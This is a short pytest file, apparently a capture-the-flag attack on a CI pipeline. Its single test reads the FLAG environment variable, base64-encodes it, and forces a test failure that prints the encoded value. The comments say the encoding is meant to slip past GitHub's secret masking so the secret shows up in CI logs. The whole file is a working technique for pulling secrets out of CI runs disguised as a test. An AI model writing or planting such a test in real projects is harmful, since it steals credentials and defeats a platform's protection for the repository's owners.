# tests/test_exfil_flag.py
import os, base64, pytest

def test_leak_flag():
    flag = os.environ.get("FLAG", "")
    # Transform so GitHub’s masking doesn’t match the literal secret
    b64 = base64.b64encode(flag.encode()).decode()
    # Put it in the failure message (shown even with output capture)
    pytest.fail("FLAG_B64=" + b64)      # <-- forces failure, reveals value in logs

